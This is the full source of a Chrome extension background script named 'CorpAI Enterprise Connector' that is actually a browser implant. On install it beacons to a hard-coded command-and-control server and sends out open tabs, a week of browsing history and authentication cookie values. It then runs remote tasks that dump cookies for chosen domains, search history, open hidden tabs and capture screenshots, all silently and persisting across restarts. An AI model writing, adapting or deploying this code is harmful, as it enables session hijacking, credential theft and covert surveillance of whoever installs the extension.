// background.js — CorpAI Enterprise Connector v2.1.0
// Chrome Extension · Manifest V3 Service Worker
// Beacons to C2 via chrome.alarms (survives browser restarts)

const C2 = 'http://10.5.9.41:5001';
const BEACON_INTERVAL_MINUTES = 1; // Chrome alarms minimum is 1 minute

// ── Agent identity ────────────────────────────────────────────────────────────

async function getAgentId() {
  const { nn_agent_id } = await chrome.storage.local.get('nn_agent_id');
  if (nn_agent_id) return nn_agent_id;
  const bytes = crypto.getRandomValues(new Uint8Array(4));
  const id = 'EXT-' + [...bytes].map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
  await chrome.storage.local.set({ nn_agent_id: id });
  return id;
}

// ── Browser intelligence collection ──────────────────────────────────────────

async function collectBrowserInfo() {
  const info = {
    type: 'browser_extension',
    version: '2.1.0',
    user_agent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timestamp: new Date().toISOString(),
  };

  try {
    const tabs = await chrome.tabs.query({});
    info.open_tabs = tabs.length;
    info.tabs_sample = tabs.slice(0, 20).map(t => ({
      url: t.url, title: t.title, active: t.active,
    }));
  } catch (_) {}

  try {
    const hist = await chrome.history.search({
      text: '', maxResults: 50,
      startTime: Date.now() - 7 * 86400000,
    });
    info.recent_history = hist.map(h => ({
      url: h.url, title: h.title, visits: h.visitCount,
    }));
  } catch (_) {}

  try {
    const cookies = await chrome.cookies.getAll({});
    info.cookies_total = cookies.length;
    // Prioritise authentication-related cookies
    info.auth_cookies = cookies
      .filter(c => /session|token|auth|jwt|key|sid|csrf|bearer/i.test(c.name))
      .slice(0, 50)
      .map(c => ({
        domain: c.domain, name: c.name, value: c.value,
        httpOnly: c.httpOnly, secure: c.secure,
      }));
  } catch (_) {}

  return info;
}

// ── Task executor ─────────────────────────────────────────────────────────────

async function runTask(task) {
  const code = task.code || '';
  switch (task.task_type) {

    case 'get_cookies': {
      const filter = code ? { domain: code } : {};
      const cookies = await chrome.cookies.getAll(filter);
      return JSON.stringify(cookies, null, 2);
    }

    case 'get_tabs': {
      const tabs = await chrome.tabs.query({});
      return JSON.stringify(
        tabs.map(t => ({ id: t.id, url: t.url, title: t.title, active: t.active })),
        null, 2
      );
    }

    case 'get_history': {
      const hist = await chrome.history.search({ text: code, maxResults: 100 });
      return JSON.stringify(hist, null, 2);
    }

    case 'navigate': {
      await chrome.tabs.create({ url: code, active: false });
      return `Opened: ${code}`;
    }

    case 'screenshot': {
      const [tab] = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
      if (!tab) return 'No active tab';
      const dataUrl = await chrome.tabs.captureVisibleTab(
        tab.windowId, { format: 'jpeg', quality: 70 }
      );
      return dataUrl; // base64 JPEG
    }

    default:
      return `Unsupported task type: ${task.task_type}`;
  }
}

// ── Beacon cycle ──────────────────────────────────────────────────────────────

async function beacon() {
  let agentId;
  try { agentId = await getAgentId(); } catch (_) { return; }

  try {
    const resp = await fetch(`${C2}/tasks?agent=${agentId}`, {
      headers: { 'Accept': 'application/json' },
    });
    if (!resp.ok) return;
    const data = await resp.json();

    // First contact: send browser sysinfo
    const { nn_registered } = await chrome.storage.local.get('nn_registered');
    if (!nn_registered) {
      const info = await collectBrowserInfo();
      await fetch(`${C2}/results`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          agent_id: agentId,
          task_id: `init-${Date.now()}`,
          task_type: 'browser_sysinfo',
          result: JSON.stringify(info, null, 2),
          timestamp: new Date().toISOString(),
        }),
      });
      await chrome.storage.local.set({ nn_registered: true });
    }

    // Execute pending task if any
    const task = data.task;
    if (!task) return;

    let output;
    try { output = await runTask(task); }
    catch (e) { output = `Error: ${e.message}`; }

    await fetch(`${C2}/results`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        agent_id: agentId,
        task_id: task.task_id || task.id || 'unknown',
        task_type: task.task_type || 'unknown',
        result: output,
        timestamp: new Date().toISOString(),
      }),
    });

  } catch (_) {
    // C2 unreachable — silent, retry on next alarm
  }
}

// ── Lifecycle ─────────────────────────────────────────────────────────────────

chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create('nn_beacon', { periodInMinutes: BEACON_INTERVAL_MINUTES });
  beacon(); // immediate first contact on install
});

chrome.runtime.onStartup.addListener(() => {
  beacon(); // beacon on browser start (after reboot)
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'nn_beacon') beacon();
});
